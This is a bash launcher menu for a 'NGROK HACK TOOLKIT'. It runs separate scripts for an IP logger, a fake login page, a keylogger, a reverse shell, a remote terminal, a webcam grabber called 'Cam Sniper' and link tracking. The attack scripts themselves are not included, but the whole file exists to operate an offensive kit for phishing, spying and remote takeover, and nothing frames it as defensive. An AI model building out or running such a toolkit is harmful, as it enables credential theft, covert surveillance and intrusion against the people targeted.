#!/bin/bash

# Cores para o terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Função para exibir o menu
menu() {
  clear
  echo -e "${BLUE}=========${GREEN} NGROK HACK TOOLKIT ${BLUE}========="
  echo -e "${YELLOW}[1] ${GREEN}IP Logger"
  echo -e "${YELLOW}[2] ${GREEN}Fake Login"
  echo -e "${YELLOW}[3] ${GREEN}Keylogger"
  echo -e "${YELLOW}[4] ${GREEN}File Server"
  echo -e "${YELLOW}[5] ${GREEN}Reverse Shell"
  echo -e "${YELLOW}[6] ${GREEN}Track Link"
  echo -e "${YELLOW}[7] ${GREEN}Remote Terminal"
  echo -e "${YELLOW}[8] ${GREEN}Cam Sniper"
  echo -e "${YELLOW}[9] ${GREEN}Chat Secret"
  echo -e "${YELLOW}[0] ${RED}Exit${RESET}"
  echo -e "${YELLOW}Select an option: "
}

# Executando o menu
while true; do
  menu
  read option

  case $option in
    1) ./ip_logger.sh ;;
    2) ./fake_login.sh ;;
    3) ./keylogger.sh ;;
    4) ./file_server.sh ;;
    5) ./reverse_shell.sh ;;
    6) ./track_link.sh ;;
    7) ./remote_terminal.sh ;;
    8) ./cam_sniper.sh ;;
    9) ./chat_secret.sh ;;
    0) exit ;;
    *) echo -e "${RED}Invalid option!${RESET}" ;;
  esac
done
